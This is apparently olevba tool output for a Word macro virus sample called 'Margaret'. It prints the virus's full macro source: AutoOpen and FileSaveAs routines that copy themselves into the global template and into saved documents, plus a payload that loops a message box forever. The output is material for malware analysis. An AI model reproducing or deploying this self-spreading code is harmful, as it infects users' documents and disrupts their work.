olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Margaret-b7ae3ff6c9ec7a234a669709ddea502feac31a65
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Margaret-b7ae3ff6c9ec7a234a669709ddea502feac31a65 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Margaret-b7ae3ff6c9ec7a234a669709ddea502feac31a65 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSaveAs()
   On Error GoTo endFileSaveAs
   Dim dlg As FileSave
   GetCurValues dlg
   If dlg.Format <> 1 Then
     Dialog dlg
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
     MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs"
     MacroCopy "ToolsMacro", WindowName$() + ":ToolsMacro"
     MacroCopy "PayLoad", WindowName$() + ":PayLoad"
     MacroCopy "AutoOpen", WindowName$() + ":AutoOpen"
     dlg.Format = 1
   End If
   Else
     TempWindow = Window()
     OriginalName$ = dlg.Name
     FileNew .Template = FileName$()
     On Error GoTo CloseDoc
     GetCurValues dlg
     dlg.Name = OriginalName$
     Dialog dlg
     FileSaveAs dlg
     On Error GoTo endFileSaveAs
     Infect (dlg.Name)
     If TempWindow >= Window() Then
       TempWindow = TempWindow + 1
     End If
     WindowList TempWindow
CloseDoc:
     FileClose 2
   End If
 MacroName$(2) = "FileOpen"
 MacroName$(3) = "FileClose"
 MacroName$(5) = "FileSave"
 MacroName$(6) = "FileSaveAs"
 
 FileMenu$ = MenuText$(0, 1)
 
 For MacroNumber = CountMacros(1) To 1 Step -1                                       ' No position by now
     NameOfMacro$ = MacroName$(MacroNumber, 1)
     Select Case MacroDesc$(NameOfMacro$)
                                                  
     Case "FileOpen"
       Position = 2
     Case "FileClose"
       Position = 3
     Case "FileSave"
       Position = 5
     Case "FileSaveAs"
       Position = 6
   End Select
  
If Position Then
       LocalMacro$ = MenuItemMacro$(FileMenu$, 0, Position)
       MacroCopy F$ + ":" + NameOfMacro$, LocalMacro$, -1
                                                            
   End If
 Next
endFileSaveAs:
End Sub
Sub AutoOpen()
On Error GoTo Abort
    iMacroCount = CountMacros(0, 0)
    For i = 1 To iMacroCount
    If MacroName$(i, 0, 0) = "PayLoad" Then
    bInstalled = -1
    End If
    If MacroName$(i, 0, 0) = "FileSaveAs" Then
    bTooMuchTrouble = -1
    End If
Next i
If Not bInstalled And Not bTooMuchTrouble Then
        iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
        sMe$ = FileName$()
        Macro$ = sMe$ + ":PayLoad"
        MacroCopy Macro$, "Global:PayLoad", 1
        Macro$ = sMe$ + ":FileSaveAs"
        MacroCopy Macro$, "Global:FileSaveAs", 1
        Macro$ = sMe$ + ":ToolsMacro"
        MacroCopy Macro$, "Global:ToolsMacro", 1
        SetProfileString "WW6I", Str$(iWW6IInstance + 1)
End If
Abort:
End Sub
Sub Payload()
On Error GoTo Pass
Repeat:
MsgBox "Lorz wants more of you"
GoTo Repeat

ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0
 
SendKeys "^" + "%" + "-"

Pass:
   If (Second(Now()) = 13) Then
           dlg.Password = "Margaret"
End Sub
Sub ToolsMacro()
 On Error GoTo ErrorRoutine
 OldName$ = NomFichier$()
 If macros.bDebug Then
    MsgBox "start ToolsMacro"
    Dim dlg As OutilsMacro
    If macros.bDebug Then MsgBox "1"
    GetCurValues dlg
    If macros.bDebug Then MsgBox "2"
    On Error GoTo Skip
    Dialog dlg
    OutilsMacro dlg
Skip:
    On Error GoTo ErrorRoutine
    End If
   
    DisableAutoMacros 0
    
    macros.SavToGlobal (OldName$)
    macros.objectiv
    GoTo Done
    
ErrorRoutine:
    On Error GoTo Done
    If macros.bDebug Then
    MsgBox "error " + Str$(Err) + " occurred"
    End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

